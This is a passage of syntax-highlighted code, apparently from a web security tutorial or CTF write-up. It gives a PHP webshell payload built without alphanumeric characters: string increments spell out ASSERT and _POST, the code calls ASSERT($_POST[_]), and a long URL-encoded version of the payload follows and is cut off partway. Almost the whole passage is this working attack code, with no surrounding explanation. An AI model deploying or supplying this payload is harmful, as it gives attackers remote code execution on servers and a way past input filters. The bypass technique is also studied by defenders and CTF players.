variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// S</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// S</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// E </span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// R</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// T</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// P</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// O</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// S</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// T</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$$____</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ASSERT($_POST[_]);</span>url编码后：<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">27</span><span class="token operator">!</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">27</span>_<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token 